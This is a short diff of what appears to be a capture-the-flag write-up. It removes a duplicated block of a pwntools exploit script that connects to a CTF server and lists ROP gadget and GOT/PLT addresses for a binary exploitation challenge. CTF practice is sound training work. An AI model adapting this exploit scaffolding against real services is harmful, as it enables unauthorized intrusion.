@@ -83,20 +83,6 @@ r.send("\x7b")
 
 ```python
 from pwn import *
-  
-HOST = "server.trustctf.com"
-PORT = 10392
-r = remote(HOST, PORT)
-#r = process("./start")
-
-pop4_ret = 0x4005EA # pop rax rdx rdi rsi
-bss_addr = 0x601058
-main_addr = 0x4005F2
-read_got = 0x601018
-read_plt = 0x4004B0
-real_rbp = 0x400660
-
-from pwn import *
 
 HOST = "server.trustctf.com"
 PORT = 10392
